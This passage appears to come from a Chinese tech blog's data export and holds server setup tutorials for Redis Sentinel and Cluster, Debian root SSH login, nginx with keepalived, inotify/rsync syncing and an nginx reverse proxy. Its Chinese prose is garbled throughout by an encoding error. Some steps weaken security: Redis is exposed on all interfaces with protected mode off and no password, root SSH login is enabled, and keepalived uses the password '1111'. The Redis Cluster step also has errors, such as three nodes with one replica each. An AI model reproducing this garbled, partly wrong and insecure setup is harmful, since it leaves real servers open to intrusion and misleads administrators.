ä¸»èŠ‚ç‚¹è´Ÿè´£å†™æ“ä½œï¼Œä»èŠ‚ç‚¹æä¾›è¯»æ“ä½œã€‚Sentinel æ£€æµ‹ä¸»èŠ‚ç‚¹æ˜¯å¦ä¸å¯ç”¨ï¼Œå¹¶è‡ªåŠ¨å°†ä»èŠ‚ç‚¹æå‡ä¸ºä¸»èŠ‚ç‚¹ã€‚æ•´ä¸ªç³»ç»Ÿå®ç°äº†é«˜å¯ç”¨æ€§ï¼Œæ— éœ€äººå·¥å¹²é¢„ã€‚ ä¸‰å°æœåŠ¡å™¨ å‡è®¾æœ‰ä¸‰å°æœåŠ¡å™¨ï¼š ä¸»èŠ‚ç‚¹ï¼ˆMasterï¼‰ï¼š192.168.1.101ä»èŠ‚ç‚¹1ï¼ˆReplica1ï¼‰ï¼š192.168.1.102ä»èŠ‚ç‚¹2ï¼ˆReplica2ï¼‰ï¼š192.168.1.103æ¯å°æœåŠ¡å™¨åŒæ—¶è¿è¡Œ Redis å’Œ Sentinelã€‚ 1. å®‰è£… Redisåœ¨æ‰€æœ‰æœåŠ¡å™¨ä¸Šå®‰è£… Redisï¼š 12sudo apt updatesudo apt install redis-server éªŒè¯ Redis å®‰è£…ï¼š 1redis-server --version 2. é…ç½®ä¸»ä»å¤åˆ¶ä¸»èŠ‚ç‚¹é…ç½®ï¼ˆ192.168.1.101ï¼‰ç¼–è¾‘ &#x2F;etc&#x2F;redis&#x2F;redis.confï¼š 123bind 0.0.0.0protected-mode noappendonly yes å¯åŠ¨ Redis ä¸»èŠ‚ç‚¹ï¼š 1sudo systemctl restart redis ä»èŠ‚ç‚¹é…ç½®ï¼ˆ192.168.1.102 å’Œ 192.168.1.103ï¼‰ç¼–è¾‘ &#x2F;etc&#x2F;redis&#x2F;redis.confï¼š 123456bind 0.0.0.0protected-mode noappendonly yes# é…ç½®ä¸ºä»èŠ‚ç‚¹ï¼ŒæŒ‡å‘ä¸»èŠ‚ç‚¹ IP å’Œç«¯å£replicaof 192.168.1.101 6379 å¯åŠ¨ Redis ä»èŠ‚ç‚¹ï¼š 12sudo systemctl restart redis éªŒè¯ä¸»ä»åŒæ­¥åœ¨ä¸»èŠ‚ç‚¹ä¸Šæ’å…¥æ•°æ®ï¼š 12redis-cliSET test_key &quot;hello_redis&quot; åœ¨ä»èŠ‚ç‚¹éªŒè¯ï¼š 123redis-cliGET test_key# åº”è¿”å› &quot;hello_redis&quot; 3. é…ç½® Sentinelé…ç½®æ–‡ä»¶è·¯å¾„é»˜è®¤ Sentinel é…ç½®æ–‡ä»¶è·¯å¾„ä¸º &#x2F;etc&#x2F;redis&#x2F;sentinel.confã€‚ ç¼–è¾‘ Sentinel é…ç½®æ–‡ä»¶åœ¨æ‰€æœ‰æœåŠ¡å™¨ï¼ˆ192.168.1.101ã€192.168.1.102ã€192.168.1.103ï¼‰ä¸Šï¼Œç¼–è¾‘ &#x2F;etc&#x2F;redis&#x2F;sentinel.confï¼š 1234567891011121314bind 0.0.0.0protected-mode no# å®šä¹‰ç›‘æ§çš„ä¸»èŠ‚ç‚¹åç§°å’Œåœ°å€sentinel monitor mymaster 192.168.1.101 6379 2# é…ç½®æ£€æµ‹ä¸»èŠ‚ç‚¹å¤±è´¥çš„æ—¶é—´ï¼ˆæ¯«ç§’ï¼‰sentinel down-after-milliseconds mymaster 5000# é…ç½®æ•…éšœè½¬ç§»å®Œæˆçš„è¶…æ—¶æ—¶é—´ï¼ˆæ¯«ç§’ï¼‰sentinel failover-timeout mymaster 10000# å¦‚æœå¯ç”¨äº†å¯†ç è®¤è¯ï¼Œè¯·è®¾ç½®ä¸»èŠ‚ç‚¹å¯†ç # sentinel auth-pass mymaster &lt;çš„å¯†ç &gt; å¯åŠ¨ Sentinelåœ¨æ¯å°æœåŠ¡å™¨ä¸Šåˆ†åˆ«å¯åŠ¨ Sentinelï¼š 1redis-server /etc/redis/sentinel.conf --sentinel 4. éªŒè¯ SentinelæŸ¥çœ‹ Sentinel çŠ¶æ€åœ¨ä»»æ„ Sentinel èŠ‚ç‚¹æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š 12redis-cli -p 26379SENTINEL masters è¾“å‡ºåº”æ˜¾ç¤ºä¸»èŠ‚ç‚¹çš„ä¿¡æ¯ï¼Œä¾‹å¦‚ï¼š name: mymaster, status: ok, slaves: 2 æ¨¡æ‹Ÿæ•…éšœè½¬ç§»æ‰‹åŠ¨åœæ­¢ä¸»èŠ‚ç‚¹æœåŠ¡ï¼š 1sudo systemctl stop redis Sentinel å°†æ£€æµ‹ä¸»èŠ‚ç‚¹ä¸å¯ç”¨ï¼Œå¹¶è‡ªåŠ¨æå‡ä»èŠ‚ç‚¹ä¸ºä¸»èŠ‚ç‚¹ã€‚éªŒè¯æ–°çš„ä¸»èŠ‚ç‚¹ï¼š 12redis-cli -p 26379SENTINEL get-master-addr-by-name mymaster æ–°ä¸»èŠ‚ç‚¹çš„ IP å’Œç«¯å£å°†è¢«è¿”å›ã€‚ 5. é«˜å¯ç”¨æ€§æµ‹è¯•åœ¨æ–°ä¸»èŠ‚ç‚¹ä¸Šæ’å…¥æ•°æ®ï¼š 12redis-cli -h &lt;æ–°ä¸»èŠ‚ç‚¹IP&gt;SET test_key2 &quot;new_data&quot; éªŒè¯æ•°æ®æ˜¯å¦åŒæ­¥åˆ°ä»èŠ‚ç‚¹ï¼š 12redis-cli -h &lt;ä»èŠ‚ç‚¹IP&gt;GET test_key2 æ€»ç»“é€šè¿‡ Redis Sentinelï¼Œå¯ä»¥å®ç°ï¼š è‡ªåŠ¨æ•…éšœæ£€æµ‹ï¼šå½“ä¸»èŠ‚ç‚¹ä¸å¯ç”¨æ—¶ï¼ŒSentinel ä¼šè‡ªåŠ¨æ£€æµ‹å¹¶è¿›è¡Œåˆ‡æ¢ã€‚è‡ªåŠ¨ä¸»ä»åˆ‡æ¢ï¼šä»èŠ‚ç‚¹è‡ªåŠ¨æå‡ä¸ºä¸»èŠ‚ç‚¹ï¼Œä¿éšœæœåŠ¡æŒç»­å¯ç”¨ã€‚æ— éœ€äººå·¥å¹²é¢„ï¼šæœåŠ¡çš„é«˜å¯ç”¨æ€§å¤§å¤§æé«˜ã€‚å¦‚éœ€è¿›ä¸€æ­¥è°ƒæ•´é…ç½®ï¼ˆå¦‚å¢åŠ èŠ‚ç‚¹æˆ–ä¼˜åŒ–å‚æ•°ï¼‰ï¼Œå¯æ ¹æ®å…·ä½“ä¸šåŠ¡éœ€æ±‚è¿›è¡Œè°ƒæ•´ã€‚ Redis Clusteræ­¥éª¤ä¸€ï¼šå®‰è£…Redisåœ¨æ¯å°æœåŠ¡å™¨ä¸Šå®‰è£…Redisã€‚ 12sudo apt updatesudo apt install redis-server æ­¥éª¤äºŒï¼šé…ç½®Rediså¤‡ä»½åŸå§‹é…ç½®æ–‡ä»¶ï¼š 1sudo cp /etc/redis/redis.conf /etc/redis/redis.conf.bak ç¼–è¾‘Redisé…ç½®æ–‡ä»¶ï¼šç¼–è¾‘ &#x2F;etc&#x2F;redis&#x2F;redis.conf æ–‡ä»¶ï¼Œè¿›è¡Œä»¥ä¸‹ä¿®æ”¹ï¼šå¯ç”¨é›†ç¾¤æ¨¡å¼ï¼š cluster-enabled yesæŒ‡å®šé›†ç¾¤é…ç½®æ–‡ä»¶ï¼š cluster-config-file nodes-6379.confè®¾ç½®èŠ‚ç‚¹è¶…æ—¶æ—¶é—´ï¼šcluster-node-timeout 5000å¯ç”¨AOFæŒä¹…åŒ–ï¼ˆå¯é€‰ï¼Œä½†æ¨èï¼‰ï¼šappendonly yesç»‘å®šæœåŠ¡å™¨çš„IPåœ°å€ï¼šå°† bind 127.0.0.1 ä¿®æ”¹ä¸ºæœåŠ¡å™¨çš„å®é™…IPåœ°å€ï¼Œä¾‹å¦‚ï¼šbind 192.168.1.1è®¾ç½®ç›‘å¬ç«¯å£ï¼šé»˜è®¤ç«¯å£æ˜¯6379ï¼Œç¡®ä¿æ¯ä¸ªèŠ‚ç‚¹çš„ç«¯å£ä¸åŒã€‚ä¾‹å¦‚ï¼Œç¬¬ä¸€å°æœåŠ¡å™¨ä¿æŒ6379ï¼Œç¬¬äºŒå°æœåŠ¡å™¨å¯ä»¥è®¾ç½®ä¸º6380ï¼Œç¬¬ä¸‰å°æœåŠ¡å™¨å¯ä»¥è®¾ç½®ä¸º6381ã€‚ æ­¥éª¤ä¸‰ï¼šå¯åŠ¨RedisæœåŠ¡åœ¨æ¯å°æœåŠ¡å™¨ä¸Šå¯åŠ¨RedisæœåŠ¡ï¼š 1sudo systemctl restart redis-server æ­¥éª¤å››ï¼šåˆ›å»ºRedisé›†ç¾¤ä¸‹è½½Rediså·¥å…·ï¼šå¦‚æœä½ è¿˜æ²¡æœ‰å®‰è£…Redisçš„å‘½ä»¤è¡Œå·¥å…·ï¼Œå¯ä»¥ä»å®˜æ–¹GitHubä»“åº“ä¸‹è½½æœ€æ–°çš„Redisç‰ˆæœ¬ï¼Œè§£å‹åæ‰¾åˆ° redis-trib.rb è„šæœ¬ã€‚åˆ›å»ºé›†ç¾¤ï¼šä½¿ç”¨ redis-cli å·¥å…·æ¥åˆ›å»ºé›†ç¾¤ã€‚å‡è®¾ä½ çš„ä¸‰å°æœåŠ¡å™¨çš„IPåœ°å€åˆ†åˆ«ä¸º 192.168.1.1ã€192.168.1.2 å’Œ 192.168.1.3ï¼Œä¸”Rediså®ä¾‹åˆ†åˆ«ç›‘å¬6379ã€6380å’Œ6381ç«¯å£ï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š 1redis-cli --cluster create 192.168.1.1:6379 192.168.1.2:6380 192.168.1.3:6381 --cluster-replicas 1 è¿™é‡Œ â€“cluster-replicas 1 è¡¨ç¤ºæ¯ä¸ªä¸»èŠ‚ç‚¹æœ‰ä¸€ä¸ªå‰¯æœ¬ã€‚ æ­¥éª¤äº”ï¼šéªŒè¯é›†ç¾¤è¿æ¥åˆ°ä»»æ„ä¸€ä¸ªèŠ‚ç‚¹ï¼š 1redis-cli -h 192.168.1.1 -p 6379 æ‰§è¡ŒåŸºæœ¬å‘½ä»¤ï¼š 12set testkey &quot;Hello Redis Cluster&quot;get testkey æ£€æŸ¥é›†ç¾¤çŠ¶æ€ï¼š 1cluster nodes æ­¥éª¤å…­ï¼šç›‘æ§å’Œç»´æŠ¤å®šæœŸæ£€æŸ¥æ—¥å¿—ï¼šæŸ¥çœ‹ &#x2F;var&#x2F;log&#x2F;redis&#x2F;redis-server.log æ–‡ä»¶ä¸­çš„æ—¥å¿—ä¿¡æ¯ï¼Œç¡®ä¿æ²¡æœ‰é”™è¯¯ã€‚ç›‘æ§æ€§èƒ½ï¼šä½¿ç”¨ redis-cli çš„ info å‘½ä»¤æ¥ç›‘æ§é›†ç¾¤çš„æ€§èƒ½å’ŒçŠ¶æ€ï¼š 1redis-cli -h 192.168.1.1 -p 6379 info Debian rootç™»å½•123echo &#x27;PermitRootLogin yes&#x27; &gt;&gt; /etc/ssh/sshd_config# é‡å¯sshæœåŠ¡ï¼Œä½¿é…ç½®ç”Ÿæ•ˆsudo systemctl restart ssh debian æ›´æ¢æº1. å¤‡ä»½æ–‡ä»¶cp &#x2F;etc&#x2F;apt&#x2F;sources.list &#x2F;etc&#x2F;apt&#x2F;sources.list.bak 2. æ›´æ”¹ sources.listæ–‡ä»¶å†…å®¹ä¸ºï¼š(å®˜æ–¹æº)deb http://deb.debian.org/debian bullseye main contrib non-freedeb-src http://deb.debian.org/debian bullseye main contrib non-free 3. æ›´æ–°apt-get -y update","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"redis","slug":"redis","permalink":"https://banjinmei.github.io/tags/redis/"}],"author":"mu"},{"title":"nginx keepalived","slug":"nginx-keepalived","date":"2024-11-21T15:37:23.000Z","updated":"2024-11-21T15:54:57.040Z","comments":true,"path":"2024/11/21/nginx-keepalived/","permalink":"https://banjinmei.github.io/2024/11/21/nginx-keepalived/","excerpt":"","text":"Keepalivedæ˜¯ä¸€ç§ç”¨äºå®ç°é«˜å¯ç”¨æ€§çš„å·¥å…·ï¼Œå®ƒé€šè¿‡VRRPï¼ˆè™šæ‹Ÿè·¯ç”±å†—ä½™åè®®ï¼‰æ¥ç®¡ç†è™šæ‹ŸIPåœ°å€ï¼Œä»è€Œç¡®ä¿åœ¨ä¸»æœåŠ¡å™¨æ•…éšœæ—¶ï¼Œå¤‡ç”¨æœåŠ¡å™¨èƒ½å¤Ÿæ¥ç®¡æœåŠ¡ã€‚ ç¯å¢ƒå‡†å¤‡å‡è®¾æœ‰ä¸¤å°DebianæœåŠ¡å™¨ï¼š Server 1 (Master): IPåœ°å€ 192.168.1.100Server 2 (Backup): IPåœ°å€ 192.168.1.101è™šæ‹ŸIPåœ°å€: 192.168.1.102 æ­¥éª¤ä¸€ï¼šå®‰è£…Nginxåœ¨ä¸¤å°æœåŠ¡å™¨ä¸Šå®‰è£…Nginxã€‚ Server 1 (Master) 12sudo apt updatesudo apt install nginx Server 2 (Backup) 12sudo apt updatesudo apt install nginx æ­¥éª¤äºŒï¼šå®‰è£…Keepalivedåœ¨ä¸¤å°æœåŠ¡å™¨ä¸Šå®‰è£…Keepalivedã€‚ Server 1 (Master) 1234sudo apt install keepalivedServer 2 (Backup)```Bashsudo apt install keepalived æ­¥éª¤ä¸‰ï¼šé…ç½®Keepalivedç¼–è¾‘Keepalivedçš„é…ç½®æ–‡ä»¶ &#x2F;etc&#x2F;keepalived&#x2F;keepalived.confã€‚ Server 1 (Master) 1sudo nano /etc/keepalived/keepalived.conf æ·»åŠ ä»¥ä¸‹é…ç½®ï¼š 12345678910111213141516vrrp_instance VI_1 &#123; state MASTER interface eth0 virtual_router_id 51 priority 100 advert_int 1 authentication &#123; auth_type PASS auth_pass 1111 &#125; virtual_ipaddress &#123; 192.168.1.102 &#125;&#125; Server 2 (Backup) 1sudo nano /etc/keepalived/keepalived.conf æ·»åŠ ä»¥ä¸‹é…ç½®ï¼š 12345678910111213141516vrrp_instance VI_1 &#123; state BACKUP interface eth0 virtual_router_id 51 priority 90 advert_int 1 authentication &#123; auth_type PASS auth_pass 1111 &#125; virtual_ipaddress &#123; 192.168.1.102 &#125;&#125; æ­¥éª¤å››ï¼šå¯åŠ¨Keepalivedå¯åŠ¨å¹¶å¯ç”¨KeepalivedæœåŠ¡ã€‚ Server 1 (Master) 12sudo systemctl start keepalivedsudo systemctl enable keepalived Server 2 (Backup) 12sudo systemctl start keepalivedsudo systemctl enable keepalived æ­¥éª¤äº”ï¼šé…ç½®Nginxç¡®ä¿ä¸¤å°æœåŠ¡å™¨ä¸Šçš„Nginxé…ç½®ç›¸åŒã€‚ç¼–è¾‘Nginxé…ç½®æ–‡ä»¶ &#x2F;etc&#x2F;nginx&#x2F;sites-available&#x2F;defaultã€‚ Nginx 123456789101112server &#123; listen 80; server_name your_domain_or_ip; location / &#123; proxy_pass http://backend_servers; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; &#125;&#125; æ­¥éª¤å…­ï¼šæµ‹è¯•é…ç½®æµ‹è¯•Nginxé…ç½®æ–‡ä»¶æ˜¯å¦æ­£ç¡®æ— è¯¯ï¼š 1sudo nginx -t é‡æ–°åŠ è½½Nginxä»¥ä½¿æ›´æ”¹ç”Ÿæ•ˆï¼š 1sudo systemctl reload nginx æ­¥éª¤ä¸ƒï¼šéªŒè¯é«˜å¯ç”¨æ€§è®¿é—®è™šæ‹ŸIPåœ°å€:ä½¿ç”¨æµè§ˆå™¨æˆ–å…¶ä»–å·¥å…·è®¿é—®è™šæ‹ŸIPåœ°å€ 192.168.1.102ï¼Œç¡®ä¿NginxæœåŠ¡æ­£å¸¸å·¥ä½œã€‚æ¨¡æ‹Ÿæ•…éšœ:å…³é—­ä¸»æœåŠ¡å™¨ä¸Šçš„NginxæœåŠ¡æˆ–KeepalivedæœåŠ¡ï¼Œè§‚å¯Ÿå¤‡ç”¨æœåŠ¡å™¨æ˜¯å¦æ¥ç®¡è™šæ‹ŸIPåœ°å€ã€‚ 12sudo systemctl stop nginxsudo systemctl stop keepalived æ£€æŸ¥çŠ¶æ€:åœ¨å¤‡ç”¨æœåŠ¡å™¨ä¸Šæ£€æŸ¥è™šæ‹ŸIPåœ°å€æ˜¯å¦å·²ç»æ¥ç®¡ï¼š 1ip addr show eth0 æ­¥éª¤å…«ï¼šæ—¥å¿—å’Œç›‘æ§æŸ¥çœ‹Keepalivedçš„æ—¥å¿—ä»¥ç¡®ä¿æ²¡æœ‰é”™è¯¯ï¼š 1sudo tail -f /var/log/syslog é€šè¿‡ä»¥ä¸Šæ­¥éª¤ï¼Œå¯ä»¥åœ¨ä¸¤å°DebianæœåŠ¡å™¨ä¸ŠæˆåŠŸéƒ¨ç½²Keepalivedå®ç°é«˜å¯ç”¨Nginxã€‚è¿™æ ·ï¼Œå³ä½¿ä¸»æœåŠ¡å™¨å‘ç”Ÿæ•…éšœï¼Œå¤‡ç”¨æœåŠ¡å™¨ä¹Ÿä¼šè‡ªåŠ¨æ¥ç®¡æœåŠ¡ï¼Œç¡®ä¿ç³»ç»Ÿçš„é«˜å¯ç”¨æ€§å’Œç¨³å®šæ€§ã€‚ ä¸åŒè™šæ‹ŸIPåœ°å€çš„é«˜å¯ç”¨æ€§ï¼šè·¨äº‘æœåŠ¡å•† 1. ä½¿ç”¨DNSè½®è¯¢é€šè¿‡DNSè½®è¯¢ï¼ˆRound Robin DNSï¼‰æ¥å®ç°è´Ÿè½½å‡è¡¡å’Œé«˜å¯ç”¨æ€§ã€‚ æ­¥éª¤ï¼šå¦‚ example.comã€‚é…ç½®DNSè®°å½•:åœ¨DNSç®¡ç†é¢æ¿ä¸­ï¼Œä¸ºçš„åŸŸåé…ç½®ä¸¤ä¸ªAè®°å½•ï¼Œåˆ†åˆ«æŒ‡å‘ä¸¤ä¸ªäº‘æœåŠ¡å•†çš„IPåœ°å€ã€‚ 12example.com. A 192.168.1.100 (é˜¿é‡Œäº‘IP)example.com. A 192.168.1.101 (è…¾è®¯äº‘IP) å®¢æˆ·ç«¯è®¿é—®:å½“å®¢æˆ·ç«¯è®¿é—® example.com æ—¶ï¼ŒDNSæœåŠ¡å™¨ä¼šè½®æµè¿”å›ä¸¤ä¸ªIPåœ°å€ä¹‹ä¸€ï¼Œå®ç°è´Ÿè½½å‡è¡¡ã€‚å¥åº·æ£€æŸ¥:å¯ä»¥ä½¿ç”¨DNSæä¾›å•†çš„å¥åº·æ£€æŸ¥åŠŸèƒ½ï¼Œè‡ªåŠ¨å°†æµé‡åˆ‡æ¢åˆ°å¥åº·çš„æœåŠ¡å™¨ã€‚ 2. ä½¿ç”¨å…¨å±€è´Ÿè½½å‡è¡¡å™¨ä¸€äº›äº‘æœåŠ¡å•†æä¾›äº†å…¨å±€è´Ÿè½½å‡è¡¡å™¨ï¼ˆGlobal Load Balancerï¼‰ï¼Œå¯ä»¥è·¨åŒºåŸŸå’Œè·¨æœåŠ¡å•†å®ç°é«˜å¯ç”¨æ€§ã€‚ nginx é…ç½®æ–‡ä»¶çš„åŒæ­¥ä½¿ç”¨ inotify å’Œ rsync å®ç°ä¸¤ä¸ª Debian æœåŠ¡å™¨ä¹‹é—´çš„æ•°æ®å®æ—¶åŒæ­¥æ˜¯ä¸€ä¸ªå¸¸è§ä¸”æœ‰æ•ˆçš„æ–¹æ³•ã€‚inotify å¯ä»¥ç›‘æ§æ–‡ä»¶ç³»ç»Ÿçš„å˜æ›´äº‹ä»¶ï¼Œè€Œ rsync åˆ™è´Ÿè´£å®é™…çš„æ•°æ®åŒæ­¥ã€‚ä»¥ä¸‹æ˜¯è¯¦ç»†çš„æ­¥éª¤ï¼š ç¯å¢ƒå‡†å¤‡Server 1 (Master): IPåœ°å€ 192.168.1.100Server 2 (Backup): IPåœ°å€ 192.168.1.101 æ­¥éª¤ä¸€ï¼šå®‰è£…å¿…è¦çš„è½¯ä»¶åœ¨ä¸¤å°æœåŠ¡å™¨ä¸Šå®‰è£… rsync å’Œ inotify-toolsã€‚ Server 1 (Master) 12sudo apt updatesudo apt install rsync inotify-tools Server 2 (Backup) 12sudo apt updatesudo apt install rsync æ­¥éª¤äºŒï¼šé…ç½® SSH å¯†é’¥å…å¯†ç™»å½•ä¸ºäº†ç®€åŒ– rsync çš„æ“ä½œï¼Œå»ºè®®é…ç½®ä»ä¸»æœåŠ¡å™¨åˆ°å¤‡ä»½æœåŠ¡å™¨çš„ SSH å¯†é’¥å…å¯†ç™»å½•ã€‚ åœ¨ä¸»æœåŠ¡å™¨ä¸Šç”Ÿæˆ SSH å¯†é’¥ 1ssh-keygen -t rsa -b 4096 æŒ‰æç¤ºæ“ä½œï¼Œé»˜è®¤ä¿å­˜è·¯å¾„å³å¯ã€‚ å°†å…¬é’¥å¤åˆ¶åˆ°å¤‡ä»½æœåŠ¡å™¨ 1ssh-copy-id user@192.168.1.101 æ­¥éª¤ä¸‰ï¼šç¼–å†™åŒæ­¥è„šæœ¬åœ¨ä¸»æœåŠ¡å™¨ä¸Šç¼–å†™ä¸€ä¸ªè„šæœ¬ï¼Œä½¿ç”¨ inotifywait ç›‘æ§æ–‡ä»¶ç³»ç»Ÿçš„å˜æ›´äº‹ä»¶ï¼Œå¹¶è°ƒç”¨ rsync è¿›è¡ŒåŒæ­¥ã€‚ åˆ›å»ºåŒæ­¥è„šæœ¬ 1nano /usr/local/bin/inotify_sync.sh æ·»åŠ ä»¥ä¸‹å†…å®¹ï¼š 123456789101112131415161718#!/bin/bash# ç›‘æ§çš„ç›®å½•WATCH_DIR=&quot;/path/to/sync&quot;# å¤‡ä»½æœåŠ¡å™¨çš„IPåœ°å€å’Œç›®æ ‡ç›®å½•REMOTE_USER=&quot;user&quot;REMOTE_HOST=&quot;192.168.1.101&quot;REMOTE_DIR=&quot;/path/to/sync&quot;# ä½¿ç”¨ inotifywait ç›‘æ§ç›®å½•å˜åŒ–inotifywait -m -r -e modify,create,delete,move &quot;$WATCH_DIR&quot; | while read path action file; do echo &quot;Change detected: $action $file on $path&quot; # ä½¿ç”¨ rsync åŒæ­¥æ–‡ä»¶ rsync -avz --delete --exclude &#x27;.git&#x27; --exclude &#x27;.DS_Store&#x27; &quot;$WATCH_DIR/&quot; &quot;$REMOTE_USER@$REMOTE_HOST:$REMOTE_DIR/&quot;done èµ‹äºˆè„šæœ¬æ‰§è¡Œæƒé™ 1chmod +x /usr/local/bin/inotify_sync.sh æ­¥éª¤å››ï¼šå¯åŠ¨åŒæ­¥è„šæœ¬å¯ä»¥æ‰‹åŠ¨å¯åŠ¨è„šæœ¬ï¼Œæˆ–è€…å°†å…¶æ·»åŠ åˆ° systemd æœåŠ¡ä¸­ä»¥ç¡®ä¿å…¶åœ¨åå°æŒç»­è¿è¡Œã€‚ æ‰‹åŠ¨å¯åŠ¨ 12nohup /usr/local/bin/inotify_sync.sh &amp; åˆ›å»º systemd æœåŠ¡ å¯åŠ¨åˆ›å»ºæœåŠ¡æ–‡ä»¶ 1sudo nano /etc/systemd/system/inotify_sync.service æ·»åŠ ä»¥ä¸‹å†…å®¹ï¼š 1234567891011121314Ini[Unit]Description=Inotify Sync ServiceAfter=network.target[Service]User=rootExecStart=/usr/local/bin/inotify_sync.shRestart=always[Install]WantedBy=multi-user.target å¯åŠ¨å¹¶å¯ç”¨æœåŠ¡ 123sudo systemctl daemon-reloadsudo systemctl start inotify_sync.servicesudo systemctl enable inotify_sync.service æ­¥éª¤äº”ï¼šéªŒè¯åŒæ­¥åœ¨ä¸»æœåŠ¡å™¨ä¸Šåˆ›å»ºæˆ–ä¿®æ”¹æ–‡ä»¶: 1echo &quot;Test content&quot; &gt; /path/to/sync/testfile.txt åœ¨å¤‡ä»½æœåŠ¡å™¨ä¸Šæ£€æŸ¥æ–‡ä»¶: 12ls /path/to/sync/cat /path/to/sync/testfile.txt æ³¨æ„äº‹é¡¹æ€§èƒ½è€ƒè™‘:inotify ä¼šæ¶ˆè€—ä¸€å®šçš„ç³»ç»Ÿèµ„æºï¼Œç‰¹åˆ«æ˜¯åœ¨ç›‘æ§å¤§é‡æ–‡ä»¶æ—¶ã€‚ç¡®ä¿çš„æœåŠ¡å™¨æœ‰è¶³å¤Ÿçš„èµ„æºæ¥å¤„ç†è¿™äº›äº‹ä»¶ã€‚å¯ä»¥é€šè¿‡æ’é™¤ä¸å¿…è¦çš„æ–‡ä»¶æˆ–ç›®å½•ï¼ˆå¦‚ .gitã€.DS_Storeï¼‰æ¥å‡å°‘ä¸å¿…è¦çš„åŒæ­¥æ“ä½œã€‚å®‰å…¨è€ƒè™‘:ç¡®ä¿ SSH å¯†é’¥çš„å®‰å…¨æ€§ï¼Œé¿å…æ³„éœ²ã€‚å¯ä»¥ä½¿ç”¨æ›´ä¸¥æ ¼çš„ SSH é…ç½®ï¼Œä¾‹å¦‚é™åˆ¶å¯†é’¥çš„ä½¿ç”¨èŒƒå›´å’Œæœ‰æ•ˆæœŸã€‚é€šè¿‡ä»¥ä¸Šæ­¥éª¤ï¼Œå¯ä»¥åœ¨ä¸¤å° Debian æœåŠ¡å™¨ä¹‹é—´ä½¿ç”¨ inotify å’Œ rsync å®ç°å®æ—¶æ•°æ®åŒæ­¥ã€‚ nginx åä»£åœ¨Debianç³»ç»Ÿä¸Šå®‰è£…Nginxå¹¶é…ç½®åå‘ä»£ç†åˆ°ç‰¹å®šçš„IPåœ°å€å’Œç«¯å£ 1. æ›´æ–°è½¯ä»¶åŒ…åˆ—è¡¨é¦–å…ˆï¼Œç¡®ä¿è½¯ä»¶åŒ…åˆ—è¡¨æ˜¯æœ€æ–°çš„ã€‚æ‰“å¼€ç»ˆç«¯å¹¶æ‰§è¡Œï¼š 1sudo apt update 2. å®‰è£…Nginx1sudo apt install nginx . é…ç½®Nginxä½œä¸ºåå‘ä»£ç†å®‰è£…å®Œæˆåï¼Œéœ€è¦ç¼–è¾‘Nginxçš„é…ç½®æ–‡ä»¶æ¥è®¾ç½®åå‘ä»£ç†ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒNginxçš„é…ç½®æ–‡ä»¶ä½äº&#x2F;etc&#x2F;nginx&#x2F;sites-available&#x2F;defaultã€‚ ä½¿ç”¨å–œæ¬¢çš„æ–‡æœ¬ç¼–è¾‘å™¨ï¼ˆå¦‚nanoæˆ–vimï¼‰æ‰“å¼€æ­¤æ–‡ä»¶ï¼š 1sudo nano /etc/nginx/sites-available/default åœ¨æ–‡ä»¶ä¸­æ‰¾åˆ°serverå—ï¼Œå¹¶æ·»åŠ æˆ–ä¿®æ”¹å¦‚ä¸‹é…ç½®ä»¥è®¾ç½®åå‘ä»£ç†ã€‚å‡è®¾è¦å°†æ‰€æœ‰è¯·æ±‚ä»£ç†åˆ°192.168.1.100:8080ï¼š 123456789101112131415161718Nginxserver &#123; listen 80; server_name your_domain_or_ip; location / &#123; proxy_pass http://192.168.1.100:8080; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; &#125;&#125;listen 80; æŒ‡å®šäº†Nginxç›‘å¬çš„ç«¯å£å·ï¼Œè¿™é‡Œä½¿ç”¨çš„æ˜¯80ç«¯å£ï¼Œå³HTTPæœåŠ¡çš„æ ‡å‡†ç«¯å£ã€‚server_name åº”è¯¥æ›¿æ¢ä¸ºåŸŸåæˆ–æœåŠ¡å™¨çš„å…¬ç½‘IPåœ°å€ã€‚proxy_pass æŒ‡ä»¤ç”¨äºæŒ‡å®šè¦ä»£ç†çš„ç›®æ ‡æœåŠ¡å™¨çš„URLã€‚proxy_set_header æŒ‡ä»¤ç”¨äºè®¾ç½®è½¬å‘ç»™åç«¯æœåŠ¡å™¨çš„è¯·æ±‚å¤´ä¿¡æ¯ã€‚ 4. æµ‹è¯•é…ç½®æ–‡ä»¶åœ¨ä¿å­˜å¹¶é€€å‡ºç¼–è¾‘å™¨ä¹‹åï¼Œæµ‹è¯•Nginxé…ç½®æ˜¯å¦æ­£ç¡®æ— è¯¯ï¼š 1sudo nginx -t å¦‚æœè¾“å‡ºæ˜¾ç¤ºè¯­æ³•æ­£ç¡®ä¸”æµ‹è¯•æˆåŠŸï¼Œå¯ä»¥ç»§ç»­ä¸‹ä¸€æ­¥ã€‚ 5. é‡æ–°åŠ è½½Nginxä½¿æ›´æ”¹ç”Ÿæ•ˆï¼Œéœ€è¦é‡æ–°åŠ è½½NginxæœåŠ¡ï¼š 1sudo systemctl reload nginx 6. éªŒè¯åå‘ä»£ç†å·¥ä½œæƒ…å†µç°åœ¨ï¼Œå¯ä»¥é€šè¿‡æµè§ˆå™¨è®¿é—®åŸŸåæˆ–æœåŠ¡å™¨çš„å…¬ç½‘IPåœ°å€ï¼Œçœ‹çœ‹æ˜¯å¦èƒ½å¤Ÿæ­£ç¡®åœ°å°†è¯·æ±‚ä»£ç†åˆ°192.168.1.100:8080ã€‚ å¦‚æœé‡åˆ°ä»»ä½•é—®é¢˜ï¼Œå¯ä»¥æŸ¥çœ‹Nginxçš„æ—¥å¿—æ–‡ä»¶æ¥è¯Šæ–­é—®é¢˜ã€‚é”™è¯¯æ—¥å¿—é€šå¸¸ä½äº&#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.logã€‚ Nginxä¸­é…ç½®å¤šä¸ªåå‘ä»£ç†ç›®æ 